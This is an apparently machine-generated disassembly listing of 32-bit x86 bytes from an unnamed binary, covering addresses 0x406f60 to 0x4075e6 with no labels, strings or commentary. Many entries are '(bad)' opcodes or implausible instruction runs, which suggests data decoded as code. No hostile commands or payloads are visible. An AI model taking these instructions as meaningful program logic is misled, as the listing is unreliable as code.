  406f60:	6b 01 81             	imul   $0xffffff81,(%ecx),%eax
  406f63:	02 3f                	add    (%edi),%bh
  406f65:	18 07                	sbb    %al,(%edi)
  406f67:	05 81 02 a2 06       	add    $0x6a20281,%eax
  406f6c:	0d 05 a9 02 eb       	or     $0xeb02a905,%eax
  406f71:	06                   	push   %es
  406f72:	47                   	inc    %edi
  406f73:	02 b1 02 56 07 47    	add    0x47075602(%ecx),%dh
  406f79:	02 c1                	add    %cl,%al
  406f7b:	01 7d 1d             	add    %edi,0x1d(%ebp)
  406f7e:	16                   	push   %ss
  406f7f:	04 81                	add    $0x81,%al
  406f81:	02 e2                	add    %dl,%ah
  406f83:	15 13 05 81 02       	adc    $0x2810513,%eax
  406f88:	34 0f                	xor    $0xf,%al
  406f8a:	0e                   	push   %cs
  406f8b:	00 89 02 fe 14 0e    	add    %cl,0xe14fe02(%ecx)
  406f91:	00 89 02 f8 06 6b    	add    %cl,0x6b06f802(%ecx)
  406f97:	01 b1 02 e2 06 47    	add    %esi,0x4706e202(%ecx)
  406f9d:	02 a1 02 e1 10 c7    	add    -0x38ef1efe(%ecx),%ah
  406fa3:	00 c1                	add    %al,%cl
  406fa5:	01 ba 18 1a 05 89    	add    %edi,-0x76fae5e8(%edx)
  406fab:	02 82 18 6b 01 89    	add    -0x76fe94e8(%edx),%al
  406fb1:	02 bf 06 20 05 89    	add    -0x76fadffa(%edi),%bh
  406fb7:	02 11                	add    (%ecx),%dl
  406fb9:	1c 4b                	sbb    $0x4b,%al
  406fbb:	02 81 02 90 1b 27    	add    0x271b9002(%ecx),%al
  406fc1:	05 c1 02 5b 14       	add    $0x145b02c1,%eax
  406fc6:	30 05 c9 02 72 08    	xor    %al,0x87202c9
  406fcc:	c7 00 91 02 c1 1c    	movl   $0x1cc10291,(%eax)
  406fd2:	35 05 c1 01 ba       	xor    $0xba01c105,%eax
  406fd7:	18 3f                	sbb    %bh,(%edi)
  406fd9:	05 91 02 b8 0a       	add    $0xab80291,%eax
  406fde:	46                   	inc    %esi
  406fdf:	05 d9 02 a3 18       	add    $0x18a302d9,%eax
  406fe4:	84 00                	test   %al,(%eax)
  406fe6:	d9 02                	flds   (%edx)
  406fe8:	d2 08                	rorb   %cl,(%eax)
  406fea:	3e 01 e1             	ds add %esp,%ecx
  406fed:	02 fe                	add    %dh,%bh
  406fef:	14 4c                	adc    $0x4c,%al
  406ff1:	05 d9 02 65 16       	add    $0x166502d9,%eax
  406ff6:	2a 01                	sub    (%ecx),%al
  406ff8:	a1 02 05 07 c3       	mov    0xc3070502,%eax
  406ffd:	00 c1                	add    %al,%cl
  406fff:	01 ba 18 01 05 99    	add    %edi,-0x66fafee8(%edx)
  407005:	02 fe                	add    %dh,%bh
  407007:	14 6b                	adc    $0x6b,%al
  407009:	01 f1                	add    %esi,%ecx
  40700b:	02 d2                	add    %dl,%dl
  40700d:	07                   	pop    %es
  40700e:	6b 01 a1             	imul   $0xffffffa1,(%ecx),%eax
  407011:	02 58 0d             	add    0xd(%eax),%bl
  407014:	c3                   	ret
  407015:	00 a1 02 15 07 c7    	add    %ah,-0x38f8eafe(%ecx)
  40701b:	00 89 02 02 0d 4b    	add    %cl,0x4b0d0202(%ecx)
  407021:	02 89 02 71 0a 4b    	add    0x4b0a7102(%ecx),%cl
  407027:	02 59 01             	add    0x1(%ecx),%bl
  40702a:	9e                   	sahf
  40702b:	1b 3e                	sbb    (%esi),%edi
  40702d:	01 59 01             	add    %ebx,0x1(%ecx)
  407030:	51                   	push   %ecx
  407031:	1d c3 00 a1 02       	sbb    $0x2a100c3,%eax
  407036:	61                   	popa
  407037:	1b c7                	sbb    %edi,%eax
  407039:	00 f9                	add    %bh,%cl
  40703b:	02 fe                	add    %dh,%bh
  40703d:	14 6b                	adc    $0x6b,%al
  40703f:	01 f9                	add    %edi,%ecx
  407041:	02 05 0b 23 02 01    	add    0x102230b,%al
  407047:	03 fe                	add    %esi,%edi
  407049:	14 0e                	adc    $0xe,%al
  40704b:	00 01                	add    %al,(%ecx)
  40704d:	03 47 07             	add    0x7(%edi),%eax
  407050:	47                   	inc    %edi
  407051:	02 c1                	add    %cl,%al
  407053:	01 92 14 47 02 c1    	add    %edx,-0x3efdb8ec(%edx)
  407059:	01 bc 17 42 02 09 03 	add    %edi,0x3090242(%edi,%edx,1)
  407060:	fe                   	(bad)
  407061:	14 6b                	adc    $0x6b,%al
  407063:	01 09                	add    %ecx,(%ecx)
  407065:	03 57 19             	add    0x19(%edi),%edx
  407068:	6a 05                	push   $0x5
  40706a:	11 03                	adc    %eax,(%ebx)
  40706c:	e6 14                	out    %al,$0x14
  40706e:	70 05                	jo     0x407075
  407070:	19 03                	sbb    %eax,(%ebx)
  407072:	e7 1a                	out    %eax,$0x1a
  407074:	76 05                	jbe    0x40707b
  407076:	21 03                	and    %eax,(%ebx)
  407078:	ce                   	into
  407079:	0f 7c                	(bad)
  40707b:	05 c1 01 03 1a       	add    $0x1a0301c1,%eax
  407080:	47                   	inc    %edi
  407081:	02 19                	add    (%ecx),%bl
  407083:	03 d3                	add    %ebx,%edx
  407085:	1b bf 01 81 02 c8    	sbb    -0x37fd7eff(%edi),%edi
  40708b:	05 86 05 29 03       	add    $0x3290586,%eax
  407090:	6e                   	outsb  %ds:(%esi),(%dx)
  407091:	00 f4                	add    %dh,%ah
  407093:	01 59 01             	add    %ebx,0x1(%ecx)
  407096:	48                   	dec    %eax
  407097:	1b 7b 00             	sbb    0x0(%ebx),%edi
  40709a:	59                   	pop    %ecx
  40709b:	01 75 07             	add    %esi,0x7(%ebp)
  40709e:	c3                   	ret
  40709f:	00 59 01             	add    %bl,0x1(%ecx)
  4070a2:	37                   	aaa
  4070a3:	07                   	pop    %es
  4070a4:	c3                   	ret
  4070a5:	00 59 01             	add    %bl,0x1(%ecx)
  4070a8:	fd                   	std
  4070a9:	10 93 05 c1 01 ba    	adc    %dl,-0x45fe3efb(%ebx)
  4070af:	18 99 05 49 03 fe    	sbb    %bl,-0x1fcb6fb(%ecx)
  4070b5:	14 0e                	adc    $0xe,%al
  4070b7:	00 61 01             	add    %ah,0x1(%ecx)
  4070ba:	52                   	push   %edx
  4070bb:	02 cd                	add    %ch,%cl
  4070bd:	03 51 03             	add    0x3(%ecx),%edx
  4070c0:	16                   	push   %ss
  4070c1:	0d 75 01 69 00       	or     $0x690175,%eax
  4070c6:	fe                   	(bad)
  4070c7:	14 0e                	adc    $0xe,%al
  4070c9:	00 21                	add    %ah,(%ecx)
  4070cb:	02 63 0c             	add    0xc(%ebx),%ah
  4070ce:	70 01                	jo     0x4070d1
  4070d0:	69 00 c9 04 aa 05    	imul   $0x5aa04c9,(%eax),%eax
  4070d6:	c1 01 c7             	roll   $0xc7,(%ecx)
  4070d9:	0c b0                	or     $0xb0,%al
  4070db:	05 c1 01 40 14       	add    $0x144001c1,%eax
  4070e0:	47                   	inc    %edi
  4070e1:	02 c1                	add    %cl,%al
  4070e3:	01 e2                	add    %esp,%edx
  4070e5:	04 bd                	add    $0xbd,%al
  4070e7:	05 59 01 d7 0f       	add    $0xfd70159,%eax
  4070ec:	1d 00 61 03 63       	sbb    $0x63036100,%eax
  4070f1:	0c 47                	or     $0x47,%al
  4070f3:	02 69 03             	add    0x3(%ecx),%ch
  4070f6:	45                   	inc    %ebp
  4070f7:	0d c3 00 b1 02       	or     $0x2b100c3,%eax
  4070fc:	b0 07                	mov    $0x7,%al
  4070fe:	c3                   	ret
  4070ff:	05 59 03 c2 07       	add    $0x7c20359,%eax
  407104:	c3                   	ret
  407105:	05 59 03 63 0c       	add    $0xc630359,%eax
  40710a:	47                   	inc    %edi
  40710b:	02 71 03             	add    0x3(%ecx),%dh
  40710e:	f3 1a c9             	repz sbb %cl,%cl
  407111:	05 79 03 fe 14       	add    $0x14fe0379,%eax
  407116:	cf                   	iret
  407117:	05 79 03 71 06       	add    $0x6710379,%eax
  40711c:	d6                   	salc
  40711d:	05 c1 00 5e 08       	add    $0x85e00c1,%eax
  407122:	0e                   	push   %cs
  407123:	00 19                	add    %bl,(%ecx)
  407125:	00 5e 08             	add    %bl,0x8(%esi)
  407128:	0e                   	push   %cs
  407129:	00 09                	add    %cl,(%ecx)
  40712b:	03 fe                	add    %esi,%edi
  40712d:	14 36                	adc    $0x36,%al
  40712f:	02 0c 00             	add    (%eax,%eax,1),%cl
  407132:	fe                   	(bad)
  407133:	14 0e                	adc    $0xe,%al
  407135:	00 0c 00             	add    %cl,(%eax,%eax,1)
  407138:	22 03                	and    (%ebx),%al
  40713a:	f5                   	cmc
  40713b:	05 0c 00 3e 1b       	add    $0x1b3e000c,%eax
  407140:	f4                   	hlt
  407141:	01 0c 00             	add    %ecx,(%eax,%eax,1)
  407144:	78 1c                	js     0x407162
  407146:	fb                   	sti
  407147:	05 c1 01 dc 10       	add    $0x10dc01c1,%eax
  40714c:	01 06                	add    %eax,(%esi)
  40714e:	51                   	push   %ecx
  40714f:	00 eb                	add    %ch,%bl
  407151:	17                   	pop    %ss
  407152:	11 06                	adc    %eax,(%esi)
  407154:	51                   	push   %ecx
  407155:	00 f4                	add    %dh,%ah
  407157:	01 17                	add    %edx,(%edi)
  407159:	06                   	push   %es
  40715a:	59                   	pop    %ecx
  40715b:	00 6b 03             	add    %ch,0x3(%ebx)
  40715e:	17                   	pop    %ss
  40715f:	06                   	push   %es
  407160:	89 03                	mov    %eax,(%ebx)
  407162:	71 1d                	jno    0x407181
  407164:	1d 06 69 00 fe       	sbb    $0xfe006906,%eax
  407169:	14 01                	adc    $0x1,%al
  40716b:	03 61 00             	add    0x0(%ecx),%esp
  40716e:	fe                   	(bad)
  40716f:	14 2d                	adc    $0x2d,%al
  407171:	06                   	push   %es
  407172:	91                   	xchg   %eax,%ecx
  407173:	03 5e 08             	add    0x8(%esi),%ebx
  407176:	0e                   	push   %cs
  407177:	00 99 03 fe 14 56    	add    %bl,0x5614fe03(%ecx)
  40717d:	04 a1                	add    $0xa1,%al
  40717f:	03 b2 0b 35 06 81    	add    -0x7ef9caf5(%edx),%esi
  407185:	02 17                	add    (%edi),%dl
  407187:	05 0a 00 91 02       	add    $0x291000a,%eax
  40718c:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40718d:	1c 35                	sbb    $0x35,%al
  40718f:	05 91 02 b8 0a       	add    $0xab80291,%eax
  407194:	43                   	inc    %ebx
  407195:	06                   	push   %es
  407196:	89 01                	mov    %eax,(%ecx)
  407198:	79 05                	jns    0x40719f
  40719a:	47                   	inc    %edi
  40719b:	02 91 02 a7 1c 54    	add    0x541ca702(%ecx),%dl
  4071a1:	06                   	push   %es
  4071a2:	91                   	xchg   %eax,%ecx
  4071a3:	02 af 0a 7c 05 91    	add    -0x6efa83f6(%edi),%ch
  4071a9:	02 98 0a 6b 01 91    	add    -0x6efe94f6(%eax),%bl
  4071af:	02 c1                	add    %cl,%al
  4071b1:	1c 5e                	sbb    $0x5e,%al
  4071b3:	06                   	push   %es
  4071b4:	91                   	xchg   %eax,%ecx
  4071b5:	02 68 05             	add    0x5(%eax),%ch
  4071b8:	6b 01 1c             	imul   $0x1c,(%ecx),%eax
  4071bb:	00 22                	add    %ah,(%edx)
  4071bd:	03 f5                	add    %ebp,%esi
  4071bf:	05 b9 03 a7 1b       	add    $0x1ba703b9,%eax
  4071c4:	7c 06                	jl     0x4071cc
  4071c6:	1c 00                	sbb    $0x0,%al
  4071c8:	e6 14                	out    %al,$0x14
  4071ca:	92                   	xchg   %eax,%edx
  4071cb:	06                   	push   %es
  4071cc:	24 00                	and    $0x0,%al
  4071ce:	e7 1a                	out    %eax,$0x1a
  4071d0:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4071d1:	06                   	push   %es
  4071d2:	1c 00                	sbb    $0x0,%al
  4071d4:	e3 0a                	jecxz  0x4071e0
  4071d6:	a9 06 24 00 d3       	test   $0xd3002406,%eax
  4071db:	1b bf 01 c9 03 b9    	sbb    -0x46fc36ff(%edi),%edi
  4071e1:	10 b3 06 c9 03 18    	adc    %dh,0x1803c906(%ebx)
  4071e7:	03 b9 06 d1 03 25    	add    0x2503d106(%ecx),%edi
  4071ed:	08 c1                	or     %al,%cl
  4071ef:	06                   	push   %es
  4071f0:	e1 03                	loope  0x4071f5
  4071f2:	ea 04 c8 06 d9 03 08 	ljmp   $0x803,$0xd906c804
  4071f9:	06                   	push   %es
  4071fa:	cf                   	iret
  4071fb:	06                   	push   %es
  4071fc:	f1                   	int1
  4071fd:	03 b3 08 d8 06 01    	add    0x106d808(%ebx),%esi
  407203:	04 ce                	add    $0xce,%al
  407205:	12 e2                	adc    %dl,%ah
  407207:	06                   	push   %es
  407208:	2c 00                	sub    $0x0,%al
  40720a:	b3 08                	mov    $0x8,%bl
  40720c:	17                   	pop    %ss
  40720d:	07                   	pop    %es
  40720e:	2c 00                	sub    $0x0,%al
  407210:	6a 19                	push   $0x19
  407212:	23 07                	and    (%edi),%eax
  407214:	34 00                	xor    $0x0,%al
  407216:	95                   	xchg   %eax,%ebp
  407217:	05 3b 07 1c 00       	add    $0x1c073b,%eax
  40721c:	fe                   	(bad)
  40721d:	14 0e                	adc    $0xe,%al
  40721f:	00 c1                	add    %al,%cl
  407221:	01 af 1d 84 00 21    	add    %ebp,0x2100841d(%edi)
  407227:	04 fe                	add    $0xfe,%al
  407229:	14 6b                	adc    $0x6b,%al
  40722b:	01 19                	add    %ebx,(%ecx)
  40722d:	04 fe                	add    $0xfe,%al
  40722f:	14 59                	adc    $0x59,%al
  407231:	07                   	pop    %es
  407232:	29 04 b2             	sub    %eax,(%edx,%esi,4)
  407235:	16                   	push   %ss
  407236:	61                   	popa
  407237:	07                   	pop    %es
  407238:	51                   	push   %ecx
  407239:	01 2e                	add    %ebp,(%esi)
  40723b:	0c 93                	or     $0x93,%al
  40723d:	01 49 04             	add    %ecx,0x4(%ecx)
  407240:	fe                   	(bad)
  407241:	14 6b                	adc    $0x6b,%al
  407243:	01 59 02             	add    %ebx,0x2(%ecx)
  407246:	fe                   	(bad)
  407247:	14 0e                	adc    $0xe,%al
  407249:	00 31                	add    %dh,(%ecx)
  40724b:	04 fe                	add    $0xfe,%al
  40724d:	14 0e                	adc    $0xe,%al
  40724f:	00 51 04             	add    %dl,0x4(%ecx)
  407252:	5a                   	pop    %edx
  407253:	0b 01                	or     (%ecx),%eax
  407255:	03 51 04             	add    0x4(%ecx),%edx
  407258:	f7 0a 01 03 51 04    	testl  $0x4510301,(%edx)
  40725e:	f9                   	stc
  40725f:	04 7a                	add    $0x7a,%al
  407261:	07                   	pop    %es
  407262:	51                   	push   %ecx
  407263:	04 a6                	add    $0xa6,%al
  407265:	0b 81 07 51 04 9f    	or     -0x60fbaef9(%ecx),%eax
  40726b:	1c 2b                	sbb    $0x2b,%al
  40726d:	02 51 04             	add    0x4(%ecx),%dl
  407270:	8c 02                	mov    %es,(%edx)
  407272:	0e                   	push   %cs
  407273:	00 51 04             	add    %dl,0x4(%ecx)
  407276:	23 15 88 07 39 04    	and    0x4390788,%edx
  40727c:	fe                   	(bad)
  40727d:	14 8e                	adc    $0x8e,%al
  40727f:	07                   	pop    %es
  407280:	51                   	push   %ecx
  407281:	04 7e                	add    $0x7e,%al
  407283:	02 31                	add    (%ecx),%dh
  407285:	02 39                	add    (%ecx),%bh
  407287:	04 49                	add    $0x49,%al
  407289:	0e                   	push   %cs
  40728a:	0e                   	push   %cs
  40728b:	00 41 04             	add    %al,0x4(%ecx)
  40728e:	fe                   	(bad)
  40728f:	14 2b                	adc    $0x2b,%al
  407291:	02 59 02             	add    0x2(%ecx),%bl
  407294:	78 1c                	js     0x4072b2
  407296:	31 02                	xor    %eax,(%edx)
  407298:	51                   	push   %ecx
  407299:	03 16                	add    (%esi),%edx
  40729b:	0d 9a 07 79 04       	or     $0x479079a,%eax
  4072a0:	fe                   	(bad)
  4072a1:	14 6b                	adc    $0x6b,%al
  4072a3:	01 51 04             	add    %edx,0x4(%ecx)
  4072a6:	85 02                	test   %eax,(%edx)
  4072a8:	2b 02                	sub    (%edx),%eax
  4072aa:	51                   	push   %ecx
  4072ab:	04 13                	add    $0x13,%al
  4072ad:	15 88 07 c1 00       	adc    $0xc10788,%eax
  4072b2:	7a 0d                	jp     0x4072c1
  4072b4:	23 02                	and    (%edx),%eax
  4072b6:	81 04 32 1d be 07 91 	addl   $0x9107be1d,(%edx,%esi,1)
  4072bd:	04 5b                	add    $0x5b,%al
  4072bf:	1c d0                	sbb    $0xd0,%al
  4072c1:	07                   	pop    %es
  4072c2:	a1 04 fe 14 0e       	mov    0xe14fe04,%eax
  4072c7:	00 c1                	add    %al,%cl
  4072c9:	01 c6                	add    %eax,%esi
  4072cb:	18 f9                	sbb    %bh,%cl
  4072cd:	07                   	pop    %es
  4072ce:	49                   	dec    %ecx
  4072cf:	02 b2 16 99 01 49    	add    0x49019916(%edx),%dh
  4072d5:	02 b2 16 ab 01 a9    	add    -0x56fe54ea(%edx),%dh
  4072db:	00 fe                	add    %bh,%dh
  4072dd:	14 0e                	adc    $0xe,%al
  4072df:	00 1c 00             	add    %bl,(%eax,%eax,1)
  4072e2:	ce                   	into
  4072e3:	0f 06                	clts
  4072e5:	08 1c 00             	or     %bl,(%eax,%eax,1)
  4072e8:	3e 1b f4             	ds sbb %esp,%esi
  4072eb:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  4072ee:	c3                   	ret
  4072ef:	12 0e                	adc    (%esi),%cl
  4072f1:	00 c1                	add    %al,%cl
  4072f3:	01 6f 17             	add    %ebp,0x17(%edi)
  4072f6:	42                   	inc    %edx
  4072f7:	02 c1                	add    %cl,%al
  4072f9:	00 8e 0a 28 08 49    	add    %cl,0x4908280a(%esi)
  4072ff:	02 b2 16 a5 01 51    	add    0x5101a516(%edx),%dh
  407305:	01 ad 00 32 08 c1    	add    %ebp,-0x3ef7ce00(%ebp)
  40730b:	01 38                	add    %edi,(%eax)
  40730d:	10 47 02             	adc    %al,0x2(%edi)
  407310:	a9 04 6c 08 37       	test   $0x37086c04,%eax
  407315:	08 51 01             	or     %dl,0x1(%ecx)
  407318:	ad                   	lods   %ds:(%esi),%eax
  407319:	00 3c 08             	add    %bh,(%eax,%ecx,1)
  40731c:	51                   	push   %ecx
  40731d:	01 ad 00 41 08 51    	add    %ebp,0x51084100(%ebp)
  407323:	01 ad 00 46 08 51    	add    %ebp,0x51084600(%ebp)
  407329:	01 ce                	add    %ecx,%esi
  40732b:	00 4d 08             	add    %cl,0x8(%ebp)
  40732e:	41                   	inc    %ecx
  40732f:	03 6c 08 52          	add    0x52(%eax,%ecx,1),%ebp
  407333:	08 51 01             	or     %dl,0x1(%ecx)
  407336:	ce                   	into
  407337:	00 57 08             	add    %dl,0x8(%edi)
  40733a:	51                   	push   %ecx
  40733b:	01 ce                	add    %ecx,%esi
  40733d:	00 5c 08 51          	add    %bl,0x51(%eax,%ecx,1)
  407341:	01 ce                	add    %ecx,%esi
  407343:	00 61 08             	add    %ah,0x8(%ecx)
  407346:	51                   	push   %ecx
  407347:	01 b4 05 68 08 b1 04 	add    %esi,0x4b10868(%ebp,%eax,1)
  40734e:	6c                   	insb   (%dx),%es:(%edi)
  40734f:	08 6d 08             	or     %ch,0x8(%ebp)
  407352:	49                   	dec    %ecx
  407353:	02 b2 16 7a 08 59    	add    0x59087a16(%edx),%dh
  407359:	03 48 1d             	add    0x1d(%eax),%ecx
  40735c:	23 02                	and    (%edx),%eax
  40735e:	e1 02                	loope  0x407362
  407360:	fe                   	(bad)
  407361:	14 88                	adc    $0x88,%al
  407363:	08 c1                	or     %al,%cl
  407365:	00 85 0a f4 01 89    	add    %al,-0x76fe0bf6(%ebp)
  40736b:	01 fe                	add    %edi,%esi
  40736d:	14 6b                	adc    $0x6b,%al
  40736f:	01 49 02             	add    %ecx,0x2(%ecx)
  407372:	e0 00                	loopne 0x407374
  407374:	b6 08                	mov    $0x8,%dh
  407376:	49                   	dec    %ecx
  407377:	02 31                	add    (%ecx),%dh
  407379:	06                   	push   %es
  40737a:	bd 08 49 02 b4       	mov    $0xb4024908,%ebp
  40737f:	05 c4 08 49 02       	add    $0x24908c4,%eax
  407384:	65 00 cb             	gs add %cl,%bl
  407387:	08 49 02             	or     %cl,0x2(%ecx)
  40738a:	ad                   	lods   %ds:(%esi),%eax
  40738b:	00 d2                	add    %dl,%dl
  40738d:	08 49 02             	or     %cl,0x2(%ecx)
  407390:	e9 00 d9 08 49       	jmp    0x49494c95
  407395:	02 ce                	add    %dh,%cl
  407397:	00 e0                	add    %ah,%al
  407399:	08 49 02             	or     %cl,0x2(%ecx)
  40739c:	b2 16                	mov    $0x16,%dl
  40739e:	12 09                	adc    (%ecx),%cl
  4073a0:	d1 04 fe             	roll   $1,(%esi,%edi,8)
  4073a3:	14 28                	adc    $0x28,%al
  4073a5:	09 09                	or     %ecx,(%ecx)
  4073a7:	00 80 00 0d 01 09    	add    %al,0x9010d00(%eax)
  4073ad:	00 84 00 12 01 09 00 	add    %al,0x90112(%eax,%eax,1)
  4073b4:	88 00                	mov    %al,(%eax)
  4073b6:	17                   	pop    %ss
  4073b7:	01 08                	add    %ecx,(%eax)
  4073b9:	00 98 00 5c 01 08    	add    %bl,0x8015c00(%eax)
  4073bf:	00 9c 00 61 01 08 00 	add    %bl,0x80161(%eax,%eax,1)
  4073c6:	a0 00 66 01 08       	mov    0x8016600,%al
  4073cb:	00 a4 00 5c 01 08 00 	add    %ah,0x8015c(%eax,%eax,1)
  4073d2:	ec                   	in     (%dx),%al
  4073d3:	00 7f 02             	add    %bh,0x2(%edi)
  4073d6:	08 00                	or     %al,(%eax)
  4073d8:	f0 00 17             	lock add %dl,(%edi)
  4073db:	01 08                	add    %ecx,(%eax)
  4073dd:	00 f4                	add    %dh,%ah
  4073df:	00 12                	add    %dl,(%edx)
  4073e1:	01 08                	add    %ecx,(%eax)
  4073e3:	00 f8                	add    %bh,%al
  4073e5:	00 84 02 08 00 fc 00 	add    %al,0xfc0008(%edx,%eax,1)
  4073ec:	89 02                	mov    %eax,(%edx)
  4073ee:	08 00                	or     %al,(%eax)
  4073f0:	00 01                	add    %al,(%ecx)
  4073f2:	8e 02                	mov    (%edx),%es
  4073f4:	08 00                	or     %al,(%eax)
  4073f6:	04 01                	add    $0x1,%al
  4073f8:	93                   	xchg   %eax,%ebx
  4073f9:	02 08                	add    (%eax),%cl
  4073fb:	00 08                	add    %cl,(%eax)
  4073fd:	01 98 02 08 00 0c    	add    %ebx,0xc000802(%eax)
  407403:	01 9d 02 08 00 10    	add    %ebx,0x10000802(%ebp)
  407409:	01 a2 02 08 00 14    	add    %esp,0x14000802(%edx)
  40740f:	01 a7 02 08 00 18    	add    %esp,0x18000802(%edi)
  407415:	01 ac 02 2e 00 2b 00 	add    %ebp,0x2b002e(%edx,%eax,1)
  40741c:	06                   	push   %es
  40741d:	03 2e                	add    (%esi),%ebp
  40741f:	00 33                	add    %dh,(%ebx)
  407421:	00 0f                	add    %cl,(%edi)
  407423:	03 2e                	add    (%esi),%ebp
  407425:	00 3b                	add    %bh,(%ebx)
  407427:	00 34 03             	add    %dh,(%ebx,%eax,1)
  40742a:	2e 00 43 00          	add    %al,%cs:0x0(%ebx)
  40742e:	3d 03 2e 00 4b       	cmp    $0x4b002e03,%eax
  407433:	00 3d 03 2e 00 53    	add    %bh,0x53002e03
  407439:	00 3d 03 2e 00 5b    	add    %bh,0x5b002e03
  40743f:	00 3d 03 2e 00 63    	add    %bh,0x63002e03
  407445:	00 3d 03 2e 00 6b    	add    %bh,0x6b002e03
  40744b:	00 3d 03 2e 00 73    	add    %bh,0x73002e03
  407451:	00 3d 03 2e 00 7b    	add    %bh,0x7b002e03
  407457:	00 43 03             	add    %al,0x3(%ebx)
  40745a:	2e 00 83 00 50 03 2e 	add    %al,%cs:0x2e035000(%ebx)
  407461:	00 8b 00 3d 03 c0    	add    %cl,-0x3ffcc300(%ebx)
  407467:	00 93 00 17 01 e0    	add    %dl,-0x1ffee900(%ebx)
  40746d:	00 93 00 17 01 00    	add    %dl,0x11700(%ebx)
  407473:	01 93 00 17 01 20    	add    %edx,0x20011700(%ebx)
  407479:	01 93 00 17 01 40    	add    %edx,0x40011700(%ebx)
  40747f:	01 93 00 17 01 60    	add    %edx,0x60011700(%ebx)
  407485:	01 93 00 17 01 80    	add    %edx,-0x7ffee900(%ebx)
  40748b:	01 93 00 17 01 a0    	add    %edx,-0x5ffee900(%ebx)
  407491:	01 93 00 17 01 c0    	add    %edx,-0x3ffee900(%ebx)
  407497:	01 93 00 17 01 e0    	add    %edx,-0x1ffee900(%ebx)
  40749d:	01 93 00 17 01 00    	add    %edx,0x11700(%ebx)
  4074a3:	02 93 00 17 01 03    	add    0x3011700(%ebx),%dl
  4074a9:	02 93 00 17 01 20    	add    0x20011700(%ebx),%dl
  4074af:	02 93 00 17 01 40    	add    0x40011700(%ebx),%dl
  4074b5:	02 93 00 17 01 60    	add    0x60011700(%ebx),%dl
  4074bb:	02 93 00 17 01 61    	add    0x61011700(%ebx),%dl
  4074c1:	02 93 00 17 01 63    	add    0x63011700(%ebx),%dl
  4074c7:	02 93 00 17 01 80    	add    -0x7ffee900(%ebx),%dl
  4074cd:	02 93 00 17 01 81    	add    -0x7efee900(%ebx),%dl
  4074d3:	02 93 00 17 01 a0    	add    -0x5ffee900(%ebx),%dl
  4074d9:	02 93 00 17 01 a1    	add    -0x5efee900(%ebx),%dl
  4074df:	02 93 00 17 01 c0    	add    -0x3ffee900(%ebx),%dl
  4074e5:	02 93 00 17 01 c1    	add    -0x3efee900(%ebx),%dl
  4074eb:	02 93 00 17 01 e0    	add    -0x1ffee900(%ebx),%dl
  4074f1:	02 93 00 17 01 e1    	add    -0x1efee900(%ebx),%dl
  4074f7:	02 93 00 17 01 e3    	add    -0x1cfee900(%ebx),%dl
  4074fd:	02 9b 00 b6 03 00    	add    0x3b600(%ebx),%bl
  407503:	03 93 00 17 01 01    	add    0x1011700(%ebx),%edx
  407509:	03 93 00 17 01 20    	add    0x20011700(%ebx),%edx
  40750f:	03 93 00 17 01 21    	add    0x21011700(%ebx),%edx
  407515:	03 93 00 17 01 40    	add    0x40011700(%ebx),%edx
  40751b:	03 93 00 17 01 41    	add    0x41011700(%ebx),%edx
  407521:	03 93 00 17 01 61    	add    0x61011700(%ebx),%edx
  407527:	03 93 00 17 01 81    	add    -0x7efee900(%ebx),%edx
  40752d:	03 93 00 17 01 a1    	add    -0x5efee900(%ebx),%edx
  407533:	03 93 00 17 01 a3    	add    -0x5cfee900(%ebx),%edx
  407539:	03 93 00 17 01 01    	add    0x1011700(%ebx),%edx
  40753f:	00 20                	add    %ah,(%eax)
  407541:	00 00                	add    %al,(%eax)
  407543:	00 14 00             	add    %dl,(%eax,%eax,1)
  407546:	01 00                	add    %eax,(%eax)
  407548:	06                   	push   %es
  407549:	00 00                	add    %al,(%eax)
  40754b:	00 1e                	add    %bl,(%esi)
  40754d:	00 c0                	add    %al,%al
  40754f:	03 c9                	add    %ecx,%ecx
  407551:	03 f4                	add    %esp,%esi
  407553:	03 9c 04 c2 04 e6 04 	add    0x4e604c2(%esp,%eax,1),%ebx
  40755a:	54                   	push   %esp
  40755b:	05 59 05 81 05       	add    $0x5810559,%eax
  407560:	8a 05 8f 05 9f 05    	mov    0x59f058f,%al
  407566:	b6 05                	mov    $0x5,%dh
  407568:	dd 05 08 06 27 06    	fldl   0x6270608
  40756e:	3c 06                	cmp    $0x6,%al
  407570:	4c                   	dec    %esp
  407571:	06                   	push   %es
  407572:	66 06                	pushw  %es
  407574:	af                   	scas   %es:(%edi),%eax
  407575:	06                   	push   %es
  407576:	53                   	push   %ebx
  407577:	07                   	pop    %es
  407578:	67 07                	addr16 pop %es
  40757a:	a3 07 cb 07 da       	mov    %eax,0xda07cb07
  40757f:	07                   	pop    %es
  407580:	e8 07 f0 07 ff       	call   0xff48658c
  407585:	07                   	pop    %es
  407586:	0c 08                	or     $0x8,%al
  407588:	11 08                	adc    %ecx,(%eax)
  40758a:	20 08                	and    %cl,(%eax)
  40758c:	2d 08 72 08 80       	sub    $0x80087208,%eax
  407591:	08 96 08 a2 08 a8    	or     %dl,-0x57f75df8(%esi)
  407597:	08 ae 08 e7 08 f1    	or     %ch,-0xef718f8(%esi)
  40759d:	08 f7                	or     %dh,%bh
  40759f:	08 fc                	or     %bh,%ah
  4075a1:	08 02                	or     %al,(%edx)
  4075a3:	09 0b                	or     %ecx,(%ebx)
  4075a5:	09 18                	or     %ebx,(%eax)
  4075a7:	09 31                	or     %esi,(%ecx)
  4075a9:	09 04 00             	or     %eax,(%eax,%eax,1)
  4075ac:	01 00                	add    %eax,(%eax)
  4075ae:	16                   	push   %ss
  4075af:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4075b2:	17                   	pop    %ss
  4075b3:	00 0d 00 18 00 0f    	add    %cl,0xf001800
  4075b9:	00 00                	add    %al,(%eax)
  4075bb:	00 5d 1a             	add    %bl,0x1a(%ebp)
  4075be:	9f                   	lahf
  4075bf:	00 00                	add    %al,(%eax)
  4075c1:	00 41 1a             	add    %al,0x1a(%ecx)
  4075c4:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4075c5:	00 00                	add    %al,(%eax)
  4075c7:	00 9a 13 a9 00 00    	add    %bl,0xa913(%edx)
  4075cd:	00 26                	add    %ah,(%esi)
  4075cf:	0b ae 00 00 00 d7    	or     -0x29000000(%esi),%ebp
  4075d5:	19 ae 00 00 00 d9    	sbb    %ebp,-0x27000000(%esi)
  4075db:	0a b2 00 00 00 56    	or     0x56000000(%edx),%dh
  4075e1:	03 b7 00 00 00 f6    	add    -0xa000000(%edi),%esi
